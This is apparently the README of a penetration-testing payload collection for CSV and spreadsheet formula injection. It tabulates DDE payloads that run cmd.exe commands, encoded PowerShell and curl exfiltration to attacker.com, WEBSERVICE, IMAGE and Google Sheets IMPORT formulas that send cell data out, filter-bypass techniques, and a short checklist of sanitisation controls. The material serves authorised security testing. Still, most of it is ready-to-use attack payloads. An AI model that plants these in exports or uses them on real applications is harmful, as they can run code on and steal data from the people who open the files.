# Formula Injection Payloads

Payloads for testing **CSV/spreadsheet formula injection** (also called CSV injection or formula injection). These test whether an application sanitises user-supplied data before writing it into spreadsheet exports (CSV, XLSX, ODS), allowing injected formulas to execute when the file is opened in Excel, LibreOffice, or Google Sheets.

---

## Attack Surface

Formula injection occurs when:
- An application exports user-controlled data (form fields, profile names, comments, messages) to CSV or XLSX without stripping or quoting formula-triggering characters
- The exported file is opened by an admin, analyst, or the user themselves in a spreadsheet application
- The application uses a report-generation library that does not escape cell values

**Formula-triggering prefixes** recognised by most spreadsheet applications:

| Prefix | Notes |
|---|---|
| `=` | Standard formula |
| `+` | Accepted as formula prefix by Excel and LibreOffice |
| `-` | Accepted as formula prefix by Excel and LibreOffice |
| `@` | Accepted as formula prefix by Excel (legacy `@` macro syntax) |

---

## Payload Index

### Basic Injection (`formula_injection_basic.csv`)

Demonstrates all four injection prefixes across a realistic multi-column CSV (Name, Email, Message). Confirms which prefix characters are not stripped or quoted by the export function.

| Payload | Prefix | Effect |
|---|---|---|
| `=cmd\|' /C calc'!A0` | `=` | DDE — launches Calculator |
| `=HYPERLINK("http://attacker.com/?x="&A1,"click")` | `=` | Clickable exfil link |
| `+cmd\|' /C whoami'!A0` | `+` | DDE via `+` prefix |
| `-2+3+cmd\|' /C whoami'!A0` | `-` | DDE embedded in arithmetic via `-` prefix |
| `@SUM(1+1)*cmd\|' /C whoami'!A0` | `@` | DDE via legacy `@` macro prefix |
| `=1+1` | `=` | Benign — confirms formula evaluation occurs at all |

---

### DDE Payloads (`formula_dde.csv`)

**Dynamic Data Exchange (DDE)** is a Windows IPC mechanism that Excel uses to communicate with other applications. A formula of the form `=cmd|'/C <command>'!A0` instructs Excel to invoke `cmd.exe`. Requires the user to click through one or two security prompts in modern Excel; no prompts in older versions or LibreOffice.

| Payload | Effect |
|---|---|
| `=cmd\|'/C calc'!A0` | Launch Calculator — confirms DDE execution |
| `=cmd\|'/C whoami > C:\out.txt'!A0` | Write current user to a file |
| `=cmd\|'/C powershell -enc <b64>'!A0` | Execute base64-encoded PowerShell payload |
| `=cmd\|'/C net user'!A0` | Enumerate local accounts |
| `=cmd\|'/C ipconfig'!A0` | Enumerate network configuration |
| `=cmd\|'/C ping attacker.com'!A0` | Out-of-band callback — confirms execution without visible output |
| `=cmd\|'/C curl http://attacker.com/?x=%username%'!A0` | Exfiltrate current username via HTTP |
| `=MSEXCEL\|'\..\..\..\Windows\System32\cmd.exe /c calc'!'` | DDE with path traversal in the application path |

> **DDE status:** Disabled by default in Excel since version 1710 (October 2017) behind a security prompt. LibreOffice Calc still executes DDE with a single confirmation dialog. Unpatched or misconfigured Excel installations remain vulnerable without prompts.

---

### Excel-Specific Functions (`formula_excel.csv`)

Tests Excel functions that make network requests or manipulate data in ways useful for exfiltration.

| Payload | Function | Effect |
|---|---|---|
| `=1+1` | Arithmetic | Baseline — confirms formula execution |
| `=SUM(1,1)` | `SUM` | Baseline formula execution |
| `=CHAR(65)&CHAR(66)` | `CHAR` | Character-code encoding — bypasses literal string filters |
| `=CONCAT("=","cmd\|' /C calc'!A0")` | `CONCAT` | Constructs a DDE payload string — tests whether output is re-evaluated |
| `=INDIRECT("A1")` | `INDIRECT` | Reference to another cell — tests indirect evaluation |
| `=WEBSERVICE("http://attacker.com/?x="&A1)` | `WEBSERVICE` | **SSRF / data exfiltration** — makes an HTTP GET request with cell contents |
| `=WEBSERVICE(CONCATENATE("http://attacker.com/",A1))` | `WEBSERVICE` + `CONCATENATE` | Exfil via concatenated URL |
| `=IMPORTDATA("http://attacker.com/")` | `IMPORTDATA` | Fetches external data into the sheet |
| `=IMAGE("http://attacker.com/track.gif")` | `IMAGE` | Pixel tracking — fires a GET request on open, no user interaction needed |
| `=ENCODEURL(A1)` | `ENCODEURL` | URL-encodes cell A1 — used to prepare data for exfil URLs |
| `=FILTERXML(WEBSERVICE("http://attacker.com/?x="&A1),"//a")` | `FILTERXML` + `WEBSERVICE` | Exfil cell value and parse attacker's response as XML |

> `WEBSERVICE` and `IMAGE` fire HTTP requests **automatically on file open** with no user interaction beyond opening the file. These are the highest-impact Excel exfil techniques.

---

### Google Sheets Functions (`formula_google_sheets.csv`)

Google Sheets executes network-fetching functions server-side when a CSV is imported. These payloads exfiltrate data or make outbound requests from Google's infrastructure.

| Payload | Function | Effect |
|---|---|---|
| `=IMPORTXML("http://attacker.com/"&A1,"//a")` | `IMPORTXML` | Fetch URL with cell value appended — SSRF + exfil |
| `=IMPORTFEED("http://attacker.com/rss")` | `IMPORTFEED` | Fetch an external RSS feed — outbound request from Google's servers |
| `=IMPORTHTML("http://attacker.com/","table",1)` | `IMPORTHTML` | Fetch external HTML table |
| `=IMPORTDATA("http://attacker.com/?x="&A2)` | `IMPORTDATA` | Exfil cell A2 via query parameter |
| `=IMAGE("http://attacker.com/track.gif?id="&A1)` | `IMAGE` | Pixel tracking with cell value in query string |
| `=HYPERLINK("http://attacker.com/?d="&ENCODEURL(A1),"click")` | `HYPERLINK` + `ENCODEURL` | Clickable link that sends URL-encoded cell value to attacker |

> Google Sheets' `IMPORT*` functions execute from Google's own servers, so the outbound request originates from a Google IP range — useful for demonstrating that data leaves the environment even if direct connections to attacker infrastructure are blocked.

---

### Exfiltration XLSX (`formula_exfil.xlsx`)

A pre-built XLSX workbook containing `WEBSERVICE`-based exfiltration formulas embedded in `xl/worksheets/sheet1.xml`. Demonstrates that formula injection is not limited to CSV — XLSX upload endpoints are equally affected. Fires an outbound HTTP request on open.

---

## Impact Summary

| Scenario | Impact |
|---|---|
| DDE execution | RCE on the machine of whoever opens the file (Windows, older Excel/LibreOffice) |
| `WEBSERVICE` / `IMAGE` | Automatic exfiltration of spreadsheet data to attacker server on file open |
| `IMPORTXML` / `IMPORTDATA` (Google Sheets) | Exfiltration via Google's servers; SSRF against internal Google Workspace infrastructure |
| `HYPERLINK` | Social-engineering exfil — user clicks a link in a trusted-looking export |
| `CONCAT` / `INDIRECT` reconstruction | Bypass sanitisation that only strips leading `=` |

---

## Bypasses

Some export libraries strip the leading formula character but can be bypassed:

| Bypass Technique | Example |
|---|---|
| `+` / `-` / `@` prefix instead of `=` | `+cmd\|' /C whoami'!A0` |
| Tab prefix (`\t=`) | Forces cell to render as text in some parsers but not all |
| Formula embedded in arithmetic | `-2+3+cmd\|' /C whoami'!A0` |
| Double-quote wrapping without escaping inner `=` | `"=cmd\|..."` — some libraries quote but don't escape |
| `CONCAT`/`INDIRECT` to reconstruct payload | `=CONCAT("=cmd\|",...)` — tests whether output is re-evaluated |
| Inject into non-first column | Libraries may only sanitise column A |

---

## What to Test For

| Control | Passes if… |
|---|---|
| Formula prefix stripping | Leading `=`, `+`, `-`, `@` are removed or the cell is prefixed with `'` (apostrophe) |
| Full quoting | Cell values are wrapped in double-quotes and internal double-quotes are escaped |
| XLSX output escaping | Formulas are stored as string type (`t="s"`) not formula type in `sheet1.xml` |
| All columns sanitised | Injection in any field (not just primary column) is neutralised |
| All prefixes covered | `+`, `-`, `@` are treated the same as `=` |

---

## Related Sections

- [`../EICAR/`](../EICAR/) — Office macro payloads (DDE + VBA) for `.doc` and `.xlsx` formats
- [`../File Name Injection/`](../File%20Name%20Injection/) — Injection via filename fields, which may also end up in CSV exports
